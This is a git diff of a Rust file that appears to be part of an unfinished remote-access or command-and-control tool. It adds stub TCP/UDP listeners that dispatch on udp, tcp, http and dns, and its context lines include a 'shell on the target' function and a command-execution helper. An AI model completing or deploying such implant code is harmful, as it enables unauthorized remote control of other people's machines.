@@ -1,8 +1,57 @@
 use std::process::Command;
-use std::net::{UdpSocket};
+use std::net::{UdpSocket, SocketAddr, TcpListener};
 
-// Function to execute command
-//
+
+
+//pub struct info {
+//  arch: String,
+//  os: String,
+//  hostname: String,
+//}
+
+pub struct Listener {
+    udp_sock: UdpSocket,
+    tcp_sock: TcpListener,
+    id: u64,
+    status: u8,
+    port: u64,
+}
+
+pub trait Listen {
+    fn run(&self, protocol: &str, address: SocketAddr);
+    fn listen_udp(&self, address: SocketAddr);
+    fn listen_tcp(&self, address: SocketAddr);
+    // fn parse_tcp();
+    // fn parse_udp();
+    // fn parse_http();
+    // fn parse_dns();
+}
+
+
+impl Listen for Listener {
+    fn run(&self, protocol: &str, address: SocketAddr){
+        match protocol {
+            "udp" => self.listen_udp(address),
+            "tcp" => self.listen_tcp(address),
+            "http" => self.listen_tcp(address),
+            "dns" => self.listen_udp(address),
+            &_ => todo!(),
+        }
+    }
+
+    fn listen_tcp(&self, address: SocketAddr){
+        println!("[+] Opening tcp listener on port {}", self.port);
+    }
+
+    fn listen_udp(&self, address: SocketAddr){
+        println!("[+] Opening udp listener on port {}", self.port);
+    }
+
+}
+
+// pub struct Sender
+
+
 
 // creates a shell on the target
 pub fn shell() {
@@ -25,18 +74,3 @@ pub fn execute_cmd(s: String) -> String {
         return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
     }
 }
-
-pub fn get_info() -> &'static str {
-    return "test anchovy";
-
-}
-
-
-// Reads in bytes from the given UDP socket and returns the string
-pub fn read_udp(socket: UdpSocket, num_bytes: usize) -> String {
-    let mut buf = vec![0; num_bytes];
-    let (_bytes, _src) = socket.recv_from(&mut buf).unwrap();
-    return String::from_utf8_lossy(&buf[..]).into_owned();
-}
-
-
